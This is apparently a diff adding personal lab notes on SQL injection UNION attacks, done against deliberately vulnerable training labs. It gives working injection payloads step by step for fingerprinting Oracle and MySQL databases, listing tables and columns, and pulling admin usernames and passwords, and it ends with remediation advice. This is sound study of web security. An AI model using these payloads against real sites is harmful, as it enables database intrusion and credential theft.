@@ -1,0 +1,143 @@
+# SQL Injection — UNION Attacks
+
+> Personal lab notes, cleaned up for a GitHub write-up. Testing was done against intentionally vulnerable training labs, not a live/production system.
+
+Since the query results are reflected in the application's response, a UNION attack can be used to pull data from other tables, not just the one the query was originally written for.
+
+## Lab 3: Examining the DB — Exposing DB Details
+
+**Goal:** confirm the vulnerable category filter and identify the database engine.
+
+1. `GET /filter?category=Gifts'+UNION+Select+*+From+dual--` → `500` error.
+2. `GET /filter?category=Gifts'+UNION+Select+null,null+From+dual--` → `200 OK`. Confirms the original query returns **2 columns**.
+3. `GET /filter?category=Gifts'+UNION+Select+'a','a'+From+dual--` → `200 OK`. Confirms both columns are **string type**.
+4. Using a DB version cheat sheet to identify the engine:
+
+   | DBMS | Version query |
+   |---|---|
+   | Oracle | `SELECT banner FROM v$version` / `SELECT version FROM v$instance` |
+   | Microsoft | `SELECT @@version` |
+   | PostgreSQL | `SELECT version()` |
+   | MySQL | `SELECT @@version` |
+
+5. Tried each, keeping the second column `null`. Payloads that don't match the actual DB return a `500` error.
+6. `GET /filter?category=Gifts'+UNION+Select+banner,null+From+v$version--` → worked, revealing the DB version/banner. **Confirmed: Oracle.**
+
+   ![Lab 3 - DB banner revealed via v$version](.screenshots/union/lab3.png)
+
+## Lab 4: Querying DB Type and Version (MySQL / Microsoft)
+
+1. `'--` → `500` error.
+2. `' union select null, null from dual --` → `500` error. (`dual` is Oracle-specific and doesn't exist on MySQL/Microsoft.)
+3. Cheat sheet used for version and comment syntax:
+
+   | DBMS | Version | Comment |
+   |---|---|---|
+   | Oracle | `SELECT banner FROM v$version` / `SELECT version FROM v$instance` | `--comment` |
+   | Microsoft | `SELECT @@version` | `--comment`, `/*comment*/` |
+   | PostgreSQL | `SELECT version()` | `--comment`, `/*comment*/` |
+   | MySQL | `SELECT @@version` | `#comment`, `-- comment` (space required after `--`), `/*comment*/` |
+
+4. `UNION SELECT @@version--` → `500` error.
+5. `UNION+SELECT+@@version#` → still `500` error.
+6. `UNION+SELECT+null,null#` → `200 OK`. Confirms 2 columns, and that `#` works as the comment terminator here.
+7. `UNION+SELECT+'a','a'#` → `500` error (column type mismatch).
+8. Since MySQL/Microsoft don't require a `FROM` clause and `@@version` returns one value, placed it in the second column: `UNION+SELECT+null,@@version#` → **worked**, revealing the DB version.
+
+   ![Lab 4 - DB version revealed via @@version](.screenshots/union/lab4.png)
+
+**Takeaway:** Oracle always needs a `FROM` clause (`FROM dual`); MySQL and Microsoft don't. Comment syntax also differs (`--` vs `#`), and MySQL's `--` requires a trailing space to be treated as a comment.
+
+## Lab 5: Listing Database Contents & Retrieving Admin Credentials
+
+**Goal:** enumerate tables/columns and recover admin login credentials.
+
+1. `GET /filter?category=Pets'+union+SELECT+*+FROM+information_schema.tables--` → `500` error.
+2. `GET /filter?category=Pets'+union+SELECT+null,null--` → `200 OK`. Confirms 2 columns (using `dual` here throws a `500`, since this isn't Oracle).
+3. `GET /filter?category=Pets'+union+SELECT+'cdfd','null'--` → `200 OK`. Confirms both columns are strings.
+4. To find table names (non-Oracle syntax, per the cheat sheet):
+
+   | DBMS | List tables | List columns |
+   |---|---|---|
+   | Oracle | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name='TABLE-NAME-HERE'` |
+   | Microsoft / PostgreSQL / MySQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name='TABLE-NAME-HERE'` |
+
+5. `GET /filter?category=Pets'+union+SELECT+table_name,null+from+information_schema.tables--` → returned the list of tables, including a randomized `users_*` table.
+
+   ![Lab 5 - table names enumerated via information_schema.tables](.screenshots/union/lab5-tables.png)
+
+6. Assumed the users table only had `username`/`password` columns and tried fetching those directly — wrong assumption, since the actual column names were also randomized.
+7. Fetched the real column names: `GET /filter?category=Pets'+union+SELECT+column_name,null+from+information_schema.columns+where+table_name='users_mdbmnp'--` → returned the column names.
+
+   ![Lab 5 - column names enumerated via information_schema.columns](.screenshots/union/lab5-columns.png)
+
+8. With the real table and column names: `GET /filter?category=Pets'+union+SELECT+username_bvtqlx,password_ndnxnm+FROM+users_mdbmnp--` → returned the credentials. Logged in as admin.
+
+   ![Lab 5 - credentials retrieved](.screenshots/union/lab5-creds.png)
+
+**Takeaway:** don't assume standard column/table names — labs (and real apps) often randomize them, so enumerate via `information_schema` rather than guessing.
+
+## Lab 6: Listing Database Contents on Oracle
+
+Same procedure as Lab 5, but using Oracle-specific syntax.
+
+1. `'--` → `200 OK`.
+
+   ![Lab 6 - confirming injection](.screenshots/union/lab6-confirm.png)
+
+2. `UNION+SELECT+NULL--` → `500` error.
+3. `UNION+SELECT+NULL,NULL--` → `500` error.
+4. `UNION+SELECT+NULL,NULL+FROM+dual--` → `200 OK`. Oracle requires the `FROM dual` clause that the other engines don't.
+
+   ![Lab 6 - FROM dual required for Oracle](.screenshots/union/lab6-dual.png)
+5. `UNION+SELECT+'ff','gyuty'+FROM+dual--` → confirms both columns are strings.
+6. `UNION+SELECT+table_name,null+FROM+all_tables--` → retrieves table names.
+7. `UNION+SELECT+column_name,null+FROM+all_tab_columns+where+table_name='USERS_OFKFLQ'--` → retrieves column names.
+8. `UNION+SELECT+USERNAME_EFPCEN,PASSWORD_SVIAZC+FROM+USERS_OFKFLQ--` → retrieves the credentials.
+
+## Lab 7: Determining the Number of Columns
+
+The `SELECT` clause fetches data from the DB; when a literal string is added in place of a real column, it gets reflected directly on the page (confirming both the column count and that the value is printed back into the response, not just processed silently).
+
+![Lab 7 - injected string reflected in the page](.screenshots/union/lab7.png)
+
+## Lab 8: Retrieving Multiple Values Within a Single Column
+
+**Goal:** the response only displays one of the two UNION columns on the page, so to exfiltrate two values (username + password) at once, they have to be concatenated into a single column.
+
+1. `GET /filter?category=Gifts'+union+select+username,password+from+users--` → `500` error. (Assumed the column types without checking — wrong assumption.)
+2. Curious whether `SELECT * FROM users` would work directly — it's rejected, since the number/types of columns in `*` won't match the original query's 2 columns.
+3. `GET /filter?category=Gifts'+union+select+'dfdrrf','gfgf'+from+users--` → `500` error.
+4. Tried concatenation directly, assuming that was the missing piece:
+   - `select+'dfdrrf'||'gfgf'+from+users--`
+   - `select+CONCAT('foo','bar')+from+users--`
+   - `select+CONCAT('foo','bar'),null+from+users--`
+
+   All three returned `500` errors — because the single concatenated value still didn't match the required 2-column shape of the original query.
+5. Narrowed it down by keeping one column `null` and the other a string: `select+null,'cvx'+from+users--` → `200 OK`.
+6. `select+null,username+from+users--` → retrieves only the username.
+7. `select+null,password+from+users--` → retrieves only the password.
+8. To get both in one shot, concatenate them into the single reflected column. Concatenation syntax differs by DBMS:
+
+   | DBMS | Syntax |
+   |---|---|
+   | Oracle | `'foo'\|\|'bar'` |
+   | Microsoft | `'foo'+'bar'` |
+   | PostgreSQL | `'foo'\|\|'bar'` |
+   | MySQL | `'foo' 'bar'` (space between the strings), or `CONCAT('foo','bar')` |
+
+9. `username||password` on its own runs the two values together with no separator, so a delimiter is added between them: `select+null,username+||+'^'+||password+from+users--` → returns `username^password` in a single column, readable in the response.
+
+   ![Lab 8 - username and password concatenated into one column](.screenshots/union/lab8.png)
+
+## Lessons
+
+- UNION injection requires matching the **column count** and **column types** of the original query — almost every step here is binary search for those two constraints before any data can be extracted.
+- `information_schema` (or Oracle's `all_tables` / `all_tab_columns`) is the standard way to enumerate schema without prior knowledge of table/column names.
+- Concatenation syntax is DBMS-specific; when only one column is reflected in the response, concatenating multiple values (with a separator) into that one column is how to read more than one piece of data per request.
+
+## Remediation
+
+- Use parameterized queries / prepared statements — this class of attack is entirely prevented by not building SQL from string concatenation.
+- Apply least-privilege database accounts so even a successful injection can't read `information_schema` or arbitrary tables.
+- Don't expose verbose DB errors (e.g. distinguishing `500` causes) to the client — they're a side-channel that materially sped up every step above.
